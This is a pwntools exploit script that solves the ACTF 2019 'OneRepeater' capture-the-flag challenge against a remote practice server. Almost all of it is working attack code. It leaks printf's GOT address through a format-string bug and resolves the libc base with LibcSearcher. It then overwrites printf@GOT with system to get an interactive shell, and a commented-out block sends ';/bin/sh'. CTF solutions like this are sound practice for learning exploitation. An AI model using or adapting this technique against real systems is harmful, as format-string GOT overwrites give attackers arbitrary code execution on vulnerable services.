from pwn import *

context(log_level='debug')

#io=process("./ACTF_2019_OneRepeater")
io=remote("node3.buuoj.cn",25696)
elf=ELF("./ACTF_2019_OneRepeater")



io.recv()
printf_got=elf.got['printf']

io.sendline(b'1')

io.recv()


#偏移16
#payload=b'a'+p32(printf_got)+b'%8$s'

payload=p32(printf_got)+b'%16$s'
io.send(payload)

io.recv()

io.sendline(b'2')

#io.recv()

io.recvuntil(b'\x08')

printf=u32(io.recv(4))
print('printf addr: ',hex(printf))

io.recv()

'''
printf_addr=u32(io.recv(4))
success('printf addr: '+hex(printf_addr))

io.recv()
payload=b'a'+p32(printf_got)+b'%8$s'

io.send(payload)

io.recvuntil(b'\x08')

printf=u32(io.recv(4))

print("printf is ",hex(printf))
io.recv()
'''
from LibcSearcher import *  

libc = LibcSearcher('printf',printf)  
#获取libc加载地址  
libc_base = printf - libc.dump('printf')  
#获取system地址  
system_addr = libc_base + libc.dump('system')  
#获取/bin/sh地址  
#binsh_addr = libc_base + libc.dump('str_bin_sh')  
io.sendline(b'1')

payload=fmtstr_payload(16,{printf_got:system_addr})

io.send(payload)

sleep(0.1)
io.recv()

io.sendline(b'2')
'''
io.recv()

io.sendline('1')



io.sendline(b';/bin/sh\x00')

io.recv()

io.sendline(b'2')
'''
io.interactive()